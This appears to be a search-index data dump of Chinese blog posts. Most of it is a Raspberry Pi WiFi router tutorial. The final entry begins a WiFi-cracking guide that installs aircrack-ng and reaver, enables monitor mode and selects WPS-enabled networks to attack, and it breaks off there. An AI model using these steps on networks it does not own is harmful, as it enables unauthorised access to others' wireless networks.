\u5230\u8fd9\u91cc\u8def\u7531\u7684NAT\u529f\u80fd\u5df2\u7ecf\u88ab\u542f\u7528\uff0c\u6211\u4eec\u5c06\u521a\u624d\u914d\u7f6e\u7684iptables\u4fdd\u5b58\u4e0b\u6765\u4ee5\u4fbf\u4e8e\u4e0b\u6b21\u4f7f\u7528\uff1a sudo sh -c \"iptables-save > /etc/iptables.ipv4.nat\" \u7f16\u8f91 /etc/network/interfaces \u7136\u540e\u5728\u6700\u540e\u52a0\u4e0a\u4e0b\u9762\u8fd9\u884c\u4ee5\u4f7f\u6bcf\u6b21\u542f\u52a8\u90fd\u81ea\u52a8\u52a0\u8f7diptables\u914d\u7f6e\uff1a up iptables-restore < /etc/iptables.ipv4.nat 4.9 \u91cd\u542f\u5e76\u6d4b\u8bd5hostapd sudo reboot \u91cd\u542f\u5b8c\u6210\u540e\uff0c\u4f7f\u7528\u4e0b\u9762\u7684\u547d\u4ee4\u6d4b\u8bd5\u662f\u5426\u6b63\u786e\uff1a sudo hostapd -dd /etc/hostapd/hostapd.conf \u5982\u679c\u6ca1\u6709\u9519\u8bef\u7684\u8bdd\uff0c\u4f60\u8fd9\u65f6\u5e94\u8be5\u80fd\u641c\u7d22\u5230\u4f60\u6240\u914d\u7f6e\u7684\u65e0\u7ebf\u4fe1\u53f7\u3002\u7136\u540eCtrl+C\u9000\u51fa\u8fd9\u4e2a\u6d4b\u8bd5\u3002 \u5982\u679c\u4e00\u5207\u6b63\u5e38\u7684\u8bdd\uff0c\u6211\u4eec\u53ef\u4ee5\u8bbe\u7f6ehostapd\u7684\u914d\u7f6e\u6587\u4ef6\u8def\u5f84\u4e86\u3002 sudo nano /etc/default/hostapd \u53bb\u6389\u6ce8\u91ca\u7b26\u53f7\u5e76\u6539\u52a8\u4e0b\u9762\u8fd9\u884c\u4e3a\u6211\u4eec\u7684\u914d\u7f6e\u6587\u4ef6\u8def\u5f84\uff1a DAEMON_CONF=\"/etc/hostapd/hostapd.conf\" 4.10 \u542f\u52a8\u76f8\u5e94\u8f6f\u4ef6\uff0c\u5e76\u52a0\u5165\u542f\u52a8\u9879 sudo service hostapd start sudo service udhcpd start sudo update-rc.d hostapd enable sudo update-rc.d udhcpd enable 2013\u5e7412\u670812\u65e5\u66f4\u65b0 \u6700\u8fd1\u7ecf\u5e38\u53d1\u73b0\u65e0\u7ebf\u7f51\u5361\u914d\u7f6e\u7684DHCP\u4e0d\u80fd\u53d1\u6325\u4f5c\u7528\uff0c\u7ecf\u8fc7\u6392\u67e5\u53d1\u73b0\u7ed9\u65e0\u7ebf\u7f51\u5361\u6307\u5b9a\u7684\u9759\u6001IP\u5931\u8d25\u4e86\uff0c\u4e5f\u5c31\u662f\u8bf4\u65e0\u7ebf\u7f51\u5361\u6ca1\u6709IP\u5bfc\u81f4DHCP\u65e0\u6cd5\u5de5\u4f5c\uff0c\u5728\u7f51\u4e0a\u627e\u5230\u8fd9\u7bc7\u6587\u7ae0 \u300aWhy won't dnsmasq's DHCP server work when using hostapd?\u300b \uff0c\u6839\u636e\u5185\u5bb9\u6211\u5c06 /etc/default/ifplugd \u7684\u5185\u5bb9\u4fee\u6539\u914d\u7f6e\u5982\u4e0b\uff1a INTERFACES=\"eth0\" HOTPLUG_INTERFACES=\"eth0\" ARGS=\"-q -f -u0 -d10 -w -I\" SUSPEND_ACTION=\"stop\" \u91cd\u542f\u4e86\u51e0\u6b21\u8fdb\u884c\u6d4b\u8bd5\uff0c\u7ed3\u679c\u4e00\u5207\u6b63\u5e38\uff01 \u539f\u6587\u94fe\u63a5\uff1a https://wangye.org/blog/archives/845/","title":"\u5c06\u6811\u8393\u6d3eRaspberry Pi\u8bbe\u7f6e\u4e3a\u65e0\u7ebf\u8def\u7531\u5668(WiFi\u70ed\u70b9AP,RTL8188CUS\u82af\u7247)"},{"location":"RPI/%E5%B0%86%E6%A0%91%E8%8E%93%E6%B4%BERaspberry%20Pi%E8%AE%BE%E7%BD%AE%E4%B8%BA%E6%97%A0%E7%BA%BF%E8%B7%AF%E7%94%B1%E5%99%A8%28WiFi%E7%83%AD%E7%82%B9AP%2CRTL8188CUS%E8%8A%AF%E7%89%87%29/#raspberry-piwifiaprtl8188cus","text":"\u63d0\u9192\uff1a \u672c\u9875\u9762\u5c06\u4e0d\u518d\u66f4\u65b0\u3001\u7ef4\u62a4\u6216\u8005\u652f\u6301\uff0c\u6587\u7ae0\u3001\u8bc4\u8bba\u6240\u53d9\u8ff0\u5185\u5bb9\u5b58\u5728\u65f6\u6548\u6027\uff0c\u6d89\u53ca\u6280\u672f\u7ec6\u8282\u6216\u8005\u8f6f\u4ef6\u4f7f\u7528\u65b9\u9762\u4e0d\u4fdd\u8bc1\u80fd\u591f\u5b8c\u5168\u6709\u6548\u53ef\u64cd\u4f5c\uff0c\u8bf7\u8c28\u614e\u53c2\u8003\uff01 \u6700\u8fd1\u53c8\u5f00\u59cb\u6298\u817e\u8d77Raspberry Pi\u6765\u4e86\uff0c\u56e0\u4e3a\u67d0\u5904\u4e0a\u7f51\u9700\u8981\u9510\u6377\u62e8\u53f7\uff0c\u4e8e\u662f\u6211\u5c31\u60f3\u80fd\u4e0d\u80fd\u8ba9\u6211\u7684\u6811\u8393\u6d3e\u4ee3\u52b3\uff0c\u5f53\u7136\u9996\u5148\u8981\u5c06\u5176\u6539\u9020\u4e3a\u8def\u7531\u5668\uff0c\u9ed8\u8ba4\u81ea\u5e26\u7684\u7f51\u53e3\u4f5c\u4e3aWAN\u53e3\uff0c\u6211\u4eec\u8fd8\u7f3a\u4e00\u4e2a\u7f51\u53e3\uff0c\u6728\u6709\u529e\u6cd5\uff0c\u53ea\u597d\u5360\u7528\u4e00\u4e2aUSB\u53e3\uff0c\u63a5\u4e0a\u4e00\u4e2aUSB\u7f51\u5361\uff0c\u7f51\u4e0a\u7684USB\u8f6cRJ45\u7f51\u7ebf\u53e3\u7684\u9002\u914d\u5668\u6bd4\u8f83\u5c11\uff0c\u4ef7\u683c\u4e5f\u4e0d\u4fbf\u5b9c\uff0c\u4e8e\u662f\u5c31\u8003\u8651\u5e72\u8106\u5c06\u5176\u6539\u9020\u6210\u65e0\u7ebf\u8def\u7531\uff0c\u4e5f\u7b26\u5408\u65f6\u4e0b\u9ad8\u7aef\u5927\u6c14\u4e0a\u6863\u6b21\u7684\u6807\u51c6\u3002 \u51c6\u5907\u5de5\u4f5c\uff0c\u5f53\u7136\u8981\u5148\u53bb\u8d2d\u4e70\u4e00\u4e2aUSB\u65e0\u7ebf\u7f51\u5361\uff0c\u53ef\u4ee5\u8d2d\u4e70\u7684\u578b\u53f7\u6bd4\u8f83\u591a\uff0cRaspberry Pi\u5b98\u65b9\u4e5f\u63d0\u4f9b\u4e86 \u517c\u5bb9\u6027\u5217\u8868 \u4f9b\u5927\u5bb6\u53c2\u8003\uff0c\u5177\u4f53\u731b\u51fb\u8fd9\u91cc\u3002\u6211\u8fd9\u91cc\u8d2d\u4e70\u7684\u662f \u7f51\u4ef6\uff08Netgear\uff09WNA1000M 150M\u8ff7\u4f60USB\u65e0\u7ebf\u7f51\u5361 \u3002 \u8f83\u4e3a\u5b98\u65b9\u7684\u4ecb\u7ecd\u914d\u7f6e\u4e3a\u65e0\u7ebf\u70ed\u70b9\u7684\u6587\u7ae0\u83ab\u8fc7\u4e8e\u8fd9\u4e00\u7bc7 \u300aRPI-Wireless-Hotspot\u300b \u3002\u4f46\u662f\u5b9e\u9645\u914d\u7f6e\u4e0b\u6765\u59cb\u7ec8\u65e0\u6cd5\u6210\u529f\u3002\u4f46\u662f\u65e0\u7ebf\u7f51\u5361\u786e\u5b9e\u80fd\u591f\u88ab\u8bc6\u522b\uff0c\u53ef\u4ee5\u901a\u8fc7 lsusb \u548c lsmod \u67e5\u770b\u5230\uff0c\u4e0d\u8fc7\u6211\u6ce8\u610f\u5230\u8fd9\u6b3e\u65e0\u7ebf\u7684\u82af\u7247\u578b\u53f7\u662fRealTek RTL8188CUS\uff0c\u521d\u6b65\u6000\u7591\u662f\u9a71\u52a8\u95ee\u9898\u3002 \u5f53\u7136\u770b\u5230\u522b\u4eba\u7684\u8001\u6b3e\u65e0\u7ebf\u7f51\u5361\u90fd\u914d\u7f6e\u6210\u529f\u4e86\u5fc3\u91cc\u96be\u514d\u75d2\u75d2\u7684\uff0c\u5f53\u7136\u4e5f\u4e0d\u80fd\u518d\u6d6a\u8d39\u94f6\u5b50\u53bb\u518d\u4e70\u4e2a\u7f51\u5361\uff0c\u4e8e\u662f\u53ea\u597d\u81ea\u5df1\u6478\u7d22\uff0c\u4e0d\u8fc7\u5929\u65e0\u7edd\u4eba\u4e4b\u8def\uff0c\u5728N\u6b21\u5237\u673a\u91cd\u88c5\u7cfb\u7edf\u540e\uff0c\u7ec8\u4e8e\u627e\u5230\u4e86\u6210\u529f\u7684\u529e\u6cd5\uff0c\u5176\u5b9e\u5173\u952e\u7684\u6587\u7ae0\u5c31\u5728\u4e0a\u9762\u90a3\u7bc7\u6587\u7ae0\u7684\u4e00\u4e2a\u94fe\u63a5\u4e2d \u300aTurn Your Raspberry Pi Into a WiFi Hotspot with Edimax Nano USB EW-7811Un (RTL8188CUS chipset)\u300b \u3002 \u597d\u4e86\uff0c\u4e0b\u9762\u6211\u5c06\u5b9e\u8df5\u7684\u8fc7\u7a0b\u8bb0\u5f55\u4e0b\u6765\u4f9b\u5927\u5bb6\u53c2\u8003\uff0c\u5f53\u7136 \u4e3b\u8981\u53c2\u8003\u4e86\u4e0a\u9762\u4e24\u7bc7\u6587\u7ae0 \uff0c\u8fd9\u91cc\u662f\u914d\u7f6e\u7684\u56de\u5fc6\uff0c\u6211\u5c3d\u91cf\u8bb0\u5f55\u8be6\u7ec6\uff0c\u9057\u6f0f\u4e4b\u5904\u671b\u6307\u51fa\u3002 1. \u5b89\u88c5\u7cfb\u7edf\uff08\u5982\u679c\u7cfb\u7edf\u5df2\u7ecf\u5b89\u88c5\u53ef\u4ee5\u8df3\u8fc7\u8fd9\u4e00\u6b65\uff09 1.1 \u5c3d\u91cf\u4f7f\u7528\u6700\u65b0\u7cfb\u7edf\uff0c\u9996\u5148\u4e0b\u8f7d \u5b98\u65b9\u6700\u65b0\u955c\u50cf \uff0c\u7136\u540e\u4f7f\u7528 Win32DiskImager \u70e7\u5f55\u5230SD\u5361\u4e0a\u3002\u6ce8\u610f\u8fd9\u91cc\u6211\u4eec\u9009\u7528\u7684\u662fRaspbian\u3002 1.2 Raspberry Pi\u8fde\u63a5\u4e0a\u65e0\u7ebf\u7f51\u5361\uff0c\u7136\u540e\u7cfb\u7edf\u955c\u50cf\u5237\u5165SD\u5361\u540e\uff0c\u6211\u4eec\u8fde\u63a5\u663e\u793a\u5668\u952e\u76d8\u548c\u9f20\u6807\u8fdb\u884c\u521d\u59cb\u5316\u914d\u7f6e\u5de5\u4f5c\uff0c\u5f53\u7136\u6ca1\u6709\u6761\u4ef6\u7684\u8bdd\u63a8\u8350\u76f4\u63a5\u4f7f\u7528SSH\u8fde\u63a5Raspberry Pi\uff0c\u8fd9\u6837\u66f4\u65b9\u4fbf\uff0c\u56e0\u4e3a\u65b0\u7cfb\u7edf\u9ed8\u8ba4\u5f00\u653e\u4e86SSH\u7ba1\u7406\u3002 \u8fde\u63a5\u4fe1\u606f\u4e3b\u8981\u5982\u4e0b\uff1a \u4e3b\u673a\u540d : raspberrypi \u7528\u6237\u540d : pi \u5bc6 \u7801 : raspberry \u5982\u679c\u4f60\u662f\u76f4\u63a5\u901a\u8fc7SSH\u8fde\u63a5\u5230Raspberry Pi\u7684\u8bdd\uff0c\u4e0b\u9762\u7684\u914d\u7f6e\u6b65\u9aa4\u662f\u5fc5\u8981\u7684\uff1a 1.2.1 \u521d\u59cb\u5316\u914d\u7f6e\uff0c\u4e0b\u9762\u7684\u914d\u7f6e\u53ea\u6709\u5728\u65b0\u5b89\u88c5\u7684\u7cfb\u7edf\u5185\u9700\u8981\uff0c\u4ec5\u505a\u4e00\u6b21\u3002 \u8fd0\u884c\u4e0b\u9762\u7684\u547d\u4ee4\uff0c\u8fdb\u5165\u914d\u7f6e\u754c\u9762\uff1a sudo raspi-config \u63a8\u8350\u66f4\u65b0\u4e0b\u9762\u7684\u914d\u7f6e\u9009\u9879\uff08 \u65b0\u914d\u7f6e\u754c\u9762 \uff09\uff1a 1 Expand Filesystem 2 Change User Password 4 Internationalisation Options I1 Change Locale I2 Change Timezone 8 Advanced Options A3 Memory Split A6 Update \uff08 \u65e7\u914d\u7f6e\u754c\u9762 \uff09 update expand_rootfs change_pass change_timezone memory_split \u8fd9\u91cc\u8981\u6ce8\u610f Memory Split/memory_split \uff0c\u9ed8\u8ba4\u9884\u7559\u7ed9\u56fe\u5f62\u754c\u9762\u7684\u662f 64MB \uff0c\u4f5c\u4e3a\u4e00\u53f0\u65e0\u7ebf\u8def\u7531\u57fa\u672c\u4e0a\u5c31\u7528\u4e0d\u5230\u56fe\u5f62\u754c\u9762\u4e86\uff0c\u5f88\u663e\u7136 64MB \u7565\u6709\u5962\u4f88\uff0c\u6211\u4eec\u5c06\u5176\u6539\u6210 32MB \u3002 \u6700\u540e Finish \u5b8c\u6210\u521d\u59cb\u5316\u914d\u7f6e\u3002\u7cfb\u7edf\u4f1a\u81ea\u52a8\u63d0\u793a\u91cd\u542f\uff0c\u5982\u679c\u6ca1\u6709\u6309\u9884\u671f\u91cd\u542f\uff0c\u8bf7\u4f7f\u7528\u4e0b\u9762\u7684\u547d\u4ee4\u91cd\u542f\u7cfb\u7edf\uff1a sudo shutdown -r now 2. \u5b89\u88c5hotspot(hostapd) sudo apt-get install bridge-utils hostapd hostapd\u5b9e\u73b0\u7684\u662f\u65e0\u7ebf\u5171\u4eab\uff0c \u4f46\u9700\u8981\u6ce8\u610f\u7684\u662f\u5b98\u65b9\u63d0\u4f9b\u7684\u7a0b\u5e8f\u4e0d\u517c\u5bb9RTL8188CUS\u82af\u7247\u7684\u65e0\u7ebf\u7f51\u5361\uff0c\u4e0d\u8fc7Edimax\u56e2\u961f\u4e3a\u6211\u4eec\u4e13\u95e8\u7f16\u8bd1\u4e86\u517c\u5bb9\u7684\u7248\u672c\uff0c\u4e0b\u9762\u7684\u64cd\u4f5c\u9700\u8981\u66ff\u6362hostapd\u4e3a\u517c\u5bb9\u7248\u672c\u3002 \u66ff\u6362\u7684\u547d\u4ee4\u5982\u4e0b\uff1a wget http://www.daveconroy.com/wp3/wp-content/uploads/2013/07/hostapd.zip unzip hostapd.zip sudo mv /usr/sbin/hostapd /usr/sbin/hostapd.bak sudo mv hostapd /usr/sbin/hostapd.edimax sudo ln -sf /usr/sbin/hostapd.edimax /usr/sbin/hostapd sudo chown root.root /usr/sbin/hostapd sudo chmod 755 /usr/sbin/hostapd \u63a5\u4e0b\u6765\u63d0\u4f9b\u4e24\u79cd\u65b9\u6848\uff0c\u4e00\u79cd\u662f\u6865\u63a5\u65b9\u5f0f\u8bbe\u7f6e\u70ed\u70b9\uff0c\u6709\u70b9\u7c7b\u4f3c\u4ea4\u6362\u673a\u5de5\u4f5c\u539f\u7406\uff0c\u5c06\u7f51\u7ebf\u53e3\u7684\u4fe1\u53f7\u8f6c\u6362\u4e3a\u65e0\u7ebf\uff0c\u53e6\u5916\u4e00\u79cd\u5219\u662f\u8def\u7531\u65b9\u5f0f\u5b9e\u73b0\u65e0\u7ebf\u4e0a\u7f51\uff0c\u548c\u5927\u90e8\u5206\u8def\u7531\u5668\u5de5\u4f5c\u65b9\u5f0f\u4e00\u6837\u3002 3. \u6865\u63a5\u7684\u65b9\u5f0f\u8bbe\u7f6eWiFi\u70ed\u70b9\uff08\u65b9\u6848\u4e00\uff09 3.1 \u5b89\u88c5\u5fc5\u5907\u7a0b\u5e8f sudo apt-get install bridge-utils 3.2 \u914d\u7f6e\u7f51\u5361 \u7f16\u8f91\u7f51\u5361\u914d\u7f6e\u6587\u4ef6\uff1a sudo nano /etc/network/interfaces \u6ce8\u91ca\u6389\u6240\u6709\u7684\u5173\u4e8e\u65e0\u7ebf\u7f51\u5361\u7684\u90e8\u5206\uff0c\u6700\u540e\u5e94\u8be5\u53d8\u6210\u4e0b\u9762\u6240\u793a\uff1a #allow-hotplug wlan0 #wpa-roam /etc/wpa_supplicant/wpa_supplicant.conf #iface default inet dhcp \u52a0\u4e0a\u4e0b\u9762\u8fd9\u6bb5\u6865\u63a5\u914d\u7f6e\uff1a auto br0 iface br0 inet dhcp bridge_ports eth0 wlan0 \u6700\u7ec8\u7684\u914d\u7f6e\u4e3b\u8981\u7531\u4ee5\u4e0b\u51e0\u4e2a\u90e8\u5206\u7ec4\u6210\uff1a #loopback adapter auto lo iface lo inet loopback #wired adapter iface eth0 inet dhcp #bridge auto br0 iface br0 inet dhcp bridge_ports eth0 wlan0 3.3 \u914d\u7f6ehostapd sudo nano /etc/hostapd/hostapd.conf \u914d\u7f6e\u4fe1\u606f\u5982\u4e0b\uff1a interface=wlan0 driver=rtl871xdrv bridge=br0 ssid=My_SSID_Name channel=1 wmm_enabled=0 wpa=1 wpa_passphrase=MYPASSWORD wpa_key_mgmt=WPA-PSK wpa_pairwise=TKIP rsn_pairwise=CCMP auth_algs=1 macaddr_acl=0 \u914d\u7f6e\u6587\u4ef6\u5177\u4f53\u6211\u5c31\u4e0d\u8bf4\u4e86\uff0c\u60f3\u5fc5\u5927\u5bb6\u770b\u5185\u5bb9\u4e5f\u77e5\u9053\u5404\u9879\u7684\u542b\u4e49\uff0c\u4fdd\u5b58\u8fd9\u4e2a\u914d\u7f6e\u6587\u4ef6\u3002 3.4 \u91cd\u542f\u5e76\u6d4b\u8bd5hostapd sudo reboot \u91cd\u542f\u5b8c\u6210\u540e\uff0c\u4f7f\u7528\u4e0b\u9762\u7684\u547d\u4ee4\u6d4b\u8bd5\u662f\u5426\u6b63\u786e\uff1a sudo hostapd -dd /etc/hostapd/hostapd.conf \u5982\u679c\u6ca1\u6709\u9519\u8bef\u7684\u8bdd\uff0c\u4f60\u8fd9\u65f6\u5e94\u8be5\u80fd\u641c\u7d22\u5230\u4f60\u6240\u914d\u7f6e\u7684\u65e0\u7ebf\u4fe1\u53f7\u3002\u7136\u540eCtrl+C\u9000\u51fa\u8fd9\u4e2a\u6d4b\u8bd5\u3002 \u5982\u679c\u4e00\u5207\u6b63\u5e38\u7684\u8bdd\uff0c\u6211\u4eec\u53ef\u4ee5\u8bbe\u7f6ehostapd\u7684\u914d\u7f6e\u6587\u4ef6\u8def\u5f84\u4e86\u3002 sudo nano /etc/default/hostapd \u53bb\u6389\u6ce8\u91ca\u7b26\u53f7\u5e76\u6539\u52a8\u4e0b\u9762\u8fd9\u884c\u4e3a\u6211\u4eec\u7684\u914d\u7f6e\u6587\u4ef6\u8def\u5f84\uff1a DAEMON_CONF=\"/etc/hostapd/hostapd.conf\" \u6865\u63a5\u65b9\u5f0f\u914d\u7f6e\u5b8c\u6210\uff01 4. \u8def\u7531\u7684\u65b9\u5f0f\u8bbe\u7f6eWiFi\u70ed\u70b9\uff08\u65b9\u6848\u4e8c\uff09 4.1 \u5b89\u88c5\u5fc5\u5907\u7a0b\u5e8f sudo apt-get install udhcpd udhcpd\u4e3b\u8981\u4e3a\u8fde\u63a5\u5230WiFi\u7684\u8bbe\u5907\u81ea\u52a8\u5206\u914dIP\u5730\u5740\u7684\uff0c\u5f53\u7136\u4f60\u4e5f\u53ef\u4ee5\u6362\u7528\u4f60\u6240\u719f\u6089\u7684\u8f6f\u4ef6\u3002 4.2 \u914d\u7f6eudhcpd\uff0c\u7f16\u8f91 /etc/udhcpd.conf \uff0c\u4e3b\u8981\u5185\u5bb9\u5982\u4e0b\uff1a start 192.168.42.2 # This is the range of IPs that the hostspot will give to client devices. end 192.168.42.20 interface wlan0 # The device uDHCP listens on. remaining yes opt dns 8.8.8.8 4.2.2.2 # The DNS servers client devices will use. opt subnet 255.255.255.0 opt router 192.168.42.1 # The Pi's IP address on wlan0 which we will set up shortly. opt lease 864000 # 10 day DHCP lease time in seconds \u63a5\u4e0b\u6765\u7f16\u8f91 /etc/default/udhcpd \u5e76\u4e14\u5c06\u4e0b\u9762\u8fd9\u884c\u6ce8\u91ca\u6389\uff0c\u4ee5\u4f7fDHCP Server\u6b63\u5e38\u5de5\u4f5c\uff1a #DHCPD_ENABLED=\"no\" 4.3 \u914d\u7f6e\u65e0\u7ebf\u7f51\u5361 \u901a\u8fc7\u4e0b\u9762\u7684\u547d\u4ee4\u7ed9\u65e0\u7ebf\u7f51\u5361\u8bbe\u7f6e\u4e00\u4e2aIP\u5730\u5740\uff1a sudo ifconfig wlan0 192.168.42.1 \u5f53\u7136\u4e3a\u4e86\u4e0b\u6b21\u542f\u52a8\u4ecd\u7136\u6709\u6548\uff0c\u6211\u4eec\u9700\u8981\u914d\u7f6e /etc/network/interfaces \u6587\u4ef6\uff1a sudo nano /etc/network/interfaces \u6ce8\u91ca\u6389\u6240\u6709\u7684\u5173\u4e8e\u65e0\u7ebf\u7f51\u5361\u7684\u90e8\u5206\uff0c\u6700\u540e\u5e94\u8be5\u53d8\u6210\u4e0b\u9762\u6240\u793a\uff1a #wpa-roam /etc/wpa_supplicant/wpa_supplicant.conf #iface default inet dhcp \u6ce8\u610f\u4fdd\u7559 allow-hotplug wlan0 \uff0c\u82f1\u6587\u539f\u6587\u662f\u4e0d\u4fdd\u7559\u7684\uff0c\u4f46\u662f\u6211\u64cd\u4f5c\u4e0b\u6765\u53d1\u73b0\u5982\u679c\u4e0d\u4fdd\u7559\u8fd9\u6bb5\u7684\u8bdd\uff0c\u65e0\u7ebf\u7f51\u5361\u6709\u65f6\u65e0\u6cd5\u6b63\u5e38\u914d\u7f6eIP\uff0c\u6700\u540e\u65e0\u7ebf\u7f51\u5361IP\u7684\u914d\u7f6e\u4fe1\u606f\u5982\u4e0b\uff1a allow-hotplug wlan0 iface wlan0 inet static address 192.168.42.1 netmask 255.255.255.0 4.4 \u7f16\u8f91hostapd\u914d\u7f6e sudo nano /etc/hostapd/hostapd.conf \u5185\u5bb9\u5982\u4e0b\uff1a interface=wlan0 driver=rtl871xdrv ssid=My_SSID_Name hw_mode=g channel=6 macaddr_acl=0 auth_algs=1 ignore_broadcast_ssid=0 wpa=2 wpa_passphrase=MYPASSWORD wpa_key_mgmt=WPA-PSK wpa_pairwise=TKIP rsn_pairwise=CCMP 4.7 \u542f\u52a8IP\u8f6c\u5411\u529f\u80fd\u4ee5\u4fbf\u4e8e\u5f00\u901aNAT sudo sh -c \"echo 1 > /proc/sys/net/ipv4/ip_forward\" \u7f16\u8f91 /etc/sysctl.conf \u6539\u52a8\u4e0b\u9762\u8fd9\u884c\uff1a net.ipv4.ip_forward=1 4.8 \u914d\u7f6eiptables\u9632\u706b\u5899 sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE sudo iptables -A FORWARD -i eth0 -o wlan0 -m state --state RELATED,ESTABLISHED -j ACCEPT sudo iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT \u5230\u8fd9\u91cc\u8def\u7531\u7684NAT\u529f\u80fd\u5df2\u7ecf\u88ab\u542f\u7528\uff0c\u6211\u4eec\u5c06\u521a\u624d\u914d\u7f6e\u7684iptables\u4fdd\u5b58\u4e0b\u6765\u4ee5\u4fbf\u4e8e\u4e0b\u6b21\u4f7f\u7528\uff1a sudo sh -c \"iptables-save > /etc/iptables.ipv4.nat\" \u7f16\u8f91 /etc/network/interfaces \u7136\u540e\u5728\u6700\u540e\u52a0\u4e0a\u4e0b\u9762\u8fd9\u884c\u4ee5\u4f7f\u6bcf\u6b21\u542f\u52a8\u90fd\u81ea\u52a8\u52a0\u8f7diptables\u914d\u7f6e\uff1a up iptables-restore < /etc/iptables.ipv4.nat 4.9 \u91cd\u542f\u5e76\u6d4b\u8bd5hostapd sudo reboot \u91cd\u542f\u5b8c\u6210\u540e\uff0c\u4f7f\u7528\u4e0b\u9762\u7684\u547d\u4ee4\u6d4b\u8bd5\u662f\u5426\u6b63\u786e\uff1a sudo hostapd -dd /etc/hostapd/hostapd.conf \u5982\u679c\u6ca1\u6709\u9519\u8bef\u7684\u8bdd\uff0c\u4f60\u8fd9\u65f6\u5e94\u8be5\u80fd\u641c\u7d22\u5230\u4f60\u6240\u914d\u7f6e\u7684\u65e0\u7ebf\u4fe1\u53f7\u3002\u7136\u540eCtrl+C\u9000\u51fa\u8fd9\u4e2a\u6d4b\u8bd5\u3002 \u5982\u679c\u4e00\u5207\u6b63\u5e38\u7684\u8bdd\uff0c\u6211\u4eec\u53ef\u4ee5\u8bbe\u7f6ehostapd\u7684\u914d\u7f6e\u6587\u4ef6\u8def\u5f84\u4e86\u3002 sudo nano /etc/default/hostapd \u53bb\u6389\u6ce8\u91ca\u7b26\u53f7\u5e76\u6539\u52a8\u4e0b\u9762\u8fd9\u884c\u4e3a\u6211\u4eec\u7684\u914d\u7f6e\u6587\u4ef6\u8def\u5f84\uff1a DAEMON_CONF=\"/etc/hostapd/hostapd.conf\" 4.10 \u542f\u52a8\u76f8\u5e94\u8f6f\u4ef6\uff0c\u5e76\u52a0\u5165\u542f\u52a8\u9879 sudo service hostapd start sudo service udhcpd start sudo update-rc.d hostapd enable sudo update-rc.d udhcpd enable 2013\u5e7412\u670812\u65e5\u66f4\u65b0 \u6700\u8fd1\u7ecf\u5e38\u53d1\u73b0\u65e0\u7ebf\u7f51\u5361\u914d\u7f6e\u7684DHCP\u4e0d\u80fd\u53d1\u6325\u4f5c\u7528\uff0c\u7ecf\u8fc7\u6392\u67e5\u53d1\u73b0\u7ed9\u65e0\u7ebf\u7f51\u5361\u6307\u5b9a\u7684\u9759\u6001IP\u5931\u8d25\u4e86\uff0c\u4e5f\u5c31\u662f\u8bf4\u65e0\u7ebf\u7f51\u5361\u6ca1\u6709IP\u5bfc\u81f4DHCP\u65e0\u6cd5\u5de5\u4f5c\uff0c\u5728\u7f51\u4e0a\u627e\u5230\u8fd9\u7bc7\u6587\u7ae0 \u300aWhy won't dnsmasq's DHCP server work when using hostapd?\u300b \uff0c\u6839\u636e\u5185\u5bb9\u6211\u5c06 /etc/default/ifplugd \u7684\u5185\u5bb9\u4fee\u6539\u914d\u7f6e\u5982\u4e0b\uff1a INTERFACES=\"eth0\" HOTPLUG_INTERFACES=\"eth0\" ARGS=\"-q -f -u0 -d10 -w -I\" SUSPEND_ACTION=\"stop\" \u91cd\u542f\u4e86\u51e0\u6b21\u8fdb\u884c\u6d4b\u8bd5\uff0c\u7ed3\u679c\u4e00\u5207\u6b63\u5e38\uff01 \u539f\u6587\u94fe\u63a5\uff1a https://wangye.org/blog/archives/845/","title":"\u5c06\u6811\u8393\u6d3eRaspberry Pi\u8bbe\u7f6e\u4e3a\u65e0\u7ebf\u8def\u7531\u5668(WiFi\u70ed\u70b9AP,RTL8188CUS\u82af\u7247)"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BEwifi%E7%A0%B4%E8%A7%A3%E6%95%B4%E7%90%86%20-%20FindHao/","text":"\u6811\u8393\u6d3ewifi\u7834\u89e3[\u6574\u7406] \u786c\u4ef6\u73af\u5883 \u6811\u8393\u6d3eB+\u4e00\u4e2a\uff08\u6211\u7528\u7684\u662fdebian\u73af\u5883\uff09 PC\u4e00\u53f0\uff08\u6216\u5176\u5b83\u8bbe\u5907\u76f4\u63a5\u64cd\u4f5cPI\u5c31\u884c\uff09 \u65e0\u7ebf\u7f51\u5361\uff08\u80fd\u7528\u5c31\u884c\uff0c\u4e0d\u8fc7\u5f3a\u5927\u7684\u65e0\u7ebf\u7f51\u5361\u4f1a\u4e8b\u534a\u529f\u500d\uff0c\u6211\u7528\u76843070\uff09 Find\u6ce8\uff1a \u65e0\u7ebf\u7f51\u5361\u4e0d\u662f\u54ea\u4e2a\u90fd\u884c\uff0c\u9700\u8981\u652f\u6301\u76d1\u542c\u6a21\u5f0f\u624d\u53ef\u4ee5\uff0c\u652f\u6301\u5217\u8868\u53ef\u4ee5\u67e5\u770b\u8fd9\u91cc\uff1a https://wikidevi.com/wiki/Wireless_adapters/Chipset_table \u5b89\u88c5\u4f9d\u8d56\u5305 sudo apt-get install -y libpcap-dev libsqlite3-dev sqlite3 libpcap0.8-dev libssl-dev build-essential iw tshark subversion ethtool sudo apt-get install -y libnl-3-200 libnl-3-dev libnl-genl-3-dev libnl-genl-3-200 \u5b89\u88c5aircarck-ng svn co http://svn.aircrack-ng.org/trunk/ aircrack-ng cd aircrack-ng/ make sudo make install \u8fd8\u63d0\u793a\u4e86Run 'airodump-ng-oui-update' as root (or with sudo) to install or update Airodump-ng OUI file (Internet connection required). sudo airodump-ng-oui-update \u5b89\u88c5reaver wget http://reaver-wps.googlecode.com/files/reaver-1.4.tar.gz tar zxvf reaver-1.4.tar.gz cd reaver-1.4/src ./configure make sudo make install \u4ee5\u4e0a\u4e24\u4e2a\u8d44\u6e90\u5305\u90fd\u53ef\u4ee5\u5728\u8fd9\u91cc\u627e\u5230\uff1a \u767e\u5ea6\u7f51\u76d8\u5206\u4eab \u5982\u679c\u5b89\u88c5\u6210\u529f\u540e\uff0c\u4f1a\u6709 airmon-ng , airodump-ng , reaver \u7b49\u547d\u4ee4\u53ef\u7528\u3002 \u7834\u89e3\u6559\u7a0b sudo airmon-ng start wlan0 sudo airodump-ng mon0 \u6839\u636e\u4e0a\u9762\u7684airodump\u641c\u7d22\u5230\u7684\u65e0\u7ebf\u4fe1\u53f7\uff0c\u7136\u540e\u53ef\u4ee5\u6311\u4fe1\u53f7\u5f3a\u7684\u8fdb\u884c\u7834\u89e3\uff08\u6ce8\u610f\uff0c\u8981\u9009\u62e9\u5f00\u4e86WPS\u529f\u80fd\u7684\uff09 